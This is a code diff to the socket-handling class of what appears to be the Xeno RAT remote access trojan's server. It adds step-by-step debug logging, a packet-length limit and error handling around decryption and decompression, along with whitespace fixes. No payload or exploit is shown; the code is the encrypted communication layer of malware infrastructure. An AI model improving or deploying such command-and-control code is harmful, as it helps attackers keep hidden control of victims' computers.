@@ -8,11 +8,11 @@ using System.Threading.Tasks;
 
 namespace xeno_rat_server
 {
-    class header 
+    class header
     {
-        public bool Compressed=false;
+        public bool Compressed = false;
         public int OriginalFileSize;
-        public int T_offset=1;
+        public int T_offset = 1;
     }
     public partial class SocketHandler
     {
@@ -20,11 +20,11 @@ namespace xeno_rat_server
         public byte[] EncryptionKey;
         public int socktimeout = 0;
         private bool doProtocolUpgrade = false;
-        public SocketHandler(Socket socket, byte[] _EncryptionKey) 
+        public SocketHandler(Socket socket, byte[] _EncryptionKey)
         {
             sock = socket;
             sock.NoDelay = true;
-            EncryptionKey =_EncryptionKey;
+            EncryptionKey = _EncryptionKey;
         }
 
         /// <summary>
@@ -151,7 +151,7 @@ namespace xeno_rat_server
 
             try
             {
-                if (doProtocolUpgrade) 
+                if (doProtocolUpgrade)
                 {
                     byte[] compressedData = Compression.Compress(data);
                     byte didCompress = 0;
@@ -175,7 +175,7 @@ namespace xeno_rat_server
 
                     return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
                 }
-                else 
+                else
                 {
 
                     data = Encryption.Encrypt(data, EncryptionKey);
@@ -224,69 +224,166 @@ namespace xeno_rat_server
         {
             try
             {
+                int step = 0;
+
                 while (true)
                 {
+                    step = 1;
+                    Console.WriteLine("[ReceiveAsync] Step 1: Waiting for 4-byte length...");
+
                     byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
                     if (length_data == null)
                     {
-                        return null;//disconnect
+                        Console.WriteLine("[ReceiveAsync] Step 1a: length_data is null (client disconnected)");
+                        return null;
                     }
+
                     int length = BytesToInt(length_data);
-                    byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
+                    Console.WriteLine($"[ReceiveAsync] Step 2: Got packet length = {length}");
+
+                    if (length <= 0 || length > 10_000_000)
+                    {
+                        Console.WriteLine($"[ReceiveAsync] Step 2a: Invalid packet length ({length}), aborting.");
+                        return null;
+                    }
+
+                    step = 3;
+                    byte[] data = await RecvAllAsync_ddos_unsafer(length);
                     if (data == null)
                     {
-                        return null;//disconnect
+                        Console.WriteLine("[ReceiveAsync] Step 3a: Data was null (client disconnected mid-read)");
+                        return null;
                     }
+
+                    Console.WriteLine($"[ReceiveAsync] Step 4: Received {data.Length} bytes. First byte = {data[0]}");
 
                     header Header;
 
-                    if (data[0] == 3)//protocol upgrade
+                    if (data[0] == 3)
                     {
-                        if (!doProtocolUpgrade) 
+                        Console.WriteLine("[ReceiveAsync] Step 5: Protocol upgrade detected.");
+
+                        if (!doProtocolUpgrade)
                         {
                             doProtocolUpgrade = true;
+                            Console.WriteLine("[ReceiveAsync] Step 5a: doProtocolUpgrade set to TRUE");
                         }
+
                         data = BTruncate(data, 1);
-                        data = Encryption.Decrypt(data, EncryptionKey);
+                        if (data == null)
+                        {
+                            Console.WriteLine("[ReceiveAsync] Step 5b: BTruncate returned null.");
+                            return null;
+                        }
+
+                        try
+                        {
+                            data = Encryption.Decrypt(data, EncryptionKey);
+                            Console.WriteLine("[ReceiveAsync] Step 5c: Decryption OK (protocol upgrade)");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"[ReceiveAsync] Step 5c: Decryption failed: {ex}");
+                            return null;
+                        }
+
+                        if (data.Length == 0)
+                        {
+                            Console.WriteLine("[ReceiveAsync] Step 5d: Decrypted data empty");
+                            return null;
+                        }
+
                         if (data[0] == 2)
                         {
+                            Console.WriteLine("[ReceiveAsync] Step 5e: Got type 2 packet, skipping...");
                             continue;
                         }
+
                         Header = ParseHeader(data);
                         if (Header == null)
                         {
-                            return null;//disconnect
+                            Console.WriteLine("[ReceiveAsync] Step 5f: ParseHeader returned null");
+                            return null;
                         }
+
                         data = BTruncate(data, Header.T_offset);
+                        if (data == null)
+                        {
+                            Console.WriteLine("[ReceiveAsync] Step 5g: BTruncate after header returned null");
+                            return null;
+                        }
+
                         if (Header.Compressed)
                         {
-                            data = Compression.Decompress(data, Header.OriginalFileSize);
+                            Console.WriteLine("[ReceiveAsync] Step 5h: Decompressing data...");
+                            try
+                            {
+                                data = Compression.Decompress(data, Header.OriginalFileSize);
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"[ReceiveAsync] Step 5h: Decompression failed: {ex}");
+                                return null;
+                            }
                         }
+
+                        Console.WriteLine($"[ReceiveAsync] Step 6: Returning data, size={data.Length}");
                         return data;
                     }
                     else if (data[0] == 2)
                     {
+                        Console.WriteLine("[ReceiveAsync] Step 7: Got type 2 packet, skipping...");
                         continue;
                     }
 
+                    step = 8;
                     Header = ParseHeader(data);
                     if (Header == null)
                     {
-                        return null;//disconnect
+                        Console.WriteLine("[ReceiveAsync] Step 8a: ParseHeader returned null");
+                        return null;
                     }
+
                     data = BTruncate(data, Header.T_offset);
+                    if (data == null)
+                    {
+                        Console.WriteLine("[ReceiveAsync] Step 8b: BTruncate returned null");
+                        return null;
+                    }
+
                     if (Header.Compressed)
                     {
-                        data = Compression.Decompress(data, Header.OriginalFileSize);
+                        Console.WriteLine("[ReceiveAsync] Step 8c: Decompressing data...");
+                        try
+                        {
+                            data = Compression.Decompress(data, Header.OriginalFileSize);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"[ReceiveAsync] Step 8c: Decompression failed: {ex}");
+                            return null;
+                        }
                     }
-                    data = Encryption.Decrypt(data, EncryptionKey);
-                    return data;
 
+                    try
+                    {
+                        data = Encryption.Decrypt(data, EncryptionKey);
+                        Console.WriteLine("[ReceiveAsync] Step 9: Decryption OK");
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[ReceiveAsync] Step 9: Decryption failed: {ex}");
+                        return null;
+                    }
+
+                    Console.WriteLine($"[ReceiveAsync] Step 10: Returning data length={data.Length}");
+                    return data;
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                return null;//disconnect
+                Console.WriteLine($"[ReceiveAsync] FATAL EXCEPTION: {ex}");
+                return null;
             }
         }
 
@@ -319,7 +416,7 @@ namespace xeno_rat_server
         /// If the first byte is not 0 or 1, the method returns null, indicating an invalid header.
         /// </remarks>
         /// <exception cref="IndexOutOfRangeException">Thrown if the provided byte array is empty or does not contain sufficient data for parsing the header.</exception>
-        private header ParseHeader(byte[] data) 
+        private header ParseHeader(byte[] data)
         {
             header Header = new header();
             if (data[0] == 1)
@@ -328,7 +425,7 @@ namespace xeno_rat_server
                 Header.OriginalFileSize = BytesToInt(data, 1);
                 Header.T_offset = 5;
             }
-            else if (data[0] != 0) 
+            else if (data[0] != 0)
             {
                 return null;
             }
@@ -346,9 +443,9 @@ namespace xeno_rat_server
         /// It then uses the Buffer.BlockCopy method to copy a portion of the input byte array starting from the specified <paramref name="offset"/> into the new byte array <paramref name="T_data"/>.
         /// The truncated byte array <paramref name="T_data"/> is then returned.
         /// </remarks>
-        public byte[] BTruncate(byte[] bytes, int offset) 
+        public byte[] BTruncate(byte[] bytes, int offset)
         {
-            byte[] T_data = new byte[bytes.Length-offset];
+            byte[] T_data = new byte[bytes.Length - offset];
             Buffer.BlockCopy(bytes, offset, T_data, 0, T_data.Length);
             return T_data;
         }
@@ -414,9 +511,9 @@ namespace xeno_rat_server
         /// <remarks>
         /// This method sets the receive timeout for the socket to the specified value in milliseconds.
         /// </remarks>
-        public void SetRecvTimeout(int ms) 
+        public void SetRecvTimeout(int ms)
         {
-            socktimeout=ms;
+            socktimeout = ms;
             sock.ReceiveTimeout = ms;
         }
 
@@ -428,7 +525,7 @@ namespace xeno_rat_server
         /// </remarks>
         public void ResetRecvTimeout()
         {
-            socktimeout=0;
+            socktimeout = 0;
             sock.ReceiveTimeout = 0;
         }
     }
